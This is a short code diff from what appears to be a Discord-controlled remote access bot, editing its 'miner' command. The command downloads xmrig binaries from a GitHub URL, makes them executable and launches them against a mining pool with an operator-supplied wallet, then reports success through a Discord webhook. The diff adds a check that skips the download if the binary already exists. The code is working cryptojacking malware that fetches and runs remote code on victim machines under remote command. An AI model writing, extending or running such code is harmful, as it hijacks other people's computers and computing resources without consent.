@@ -69,14 +69,18 @@ async def shell(ctx, *cmds):
 async def miner(ctx, walletArg):
     wallet = ''.join(walletArg)
     if sys.platform == "linux":
-        url = "https://github.com/rxu7s/XC/raw/main/xmrig"
-        r = requests.get(url)
-        open("xmrig", 'wb').write(r.content)
+        if not os.path.exists('xmrig'):
+            url = "https://github.com/rxu7s/XC/raw/main/xmrig"
+            r = requests.get(url)
+            open("xmrig", 'wb').write(r.content)
+
         os.popen(f"chmod 777 xmrig; ./xmrig --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Linux -k --tls")
     else:
-        url = "https://github.com/rxu7s/XC/raw/main/xmrig.exe"
-        r = requests.get(url)
-        open("xmrig.exe", 'wb').write(r.content)
+        if not os.path.exists('xmrig.exe'):
+            url = "https://github.com/rxu7s/XC/raw/main/xmrig.exe"
+            r = requests.get(url)
+            open("xmrig.exe", 'wb').write(r.content)
+            
         os.popen(f"xmrig.exe --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Windows -k --tls")
 
     webhook = DiscordWebhook(webhook_url, content='``miner started``', username=bot_name, avatar_url=avatar)
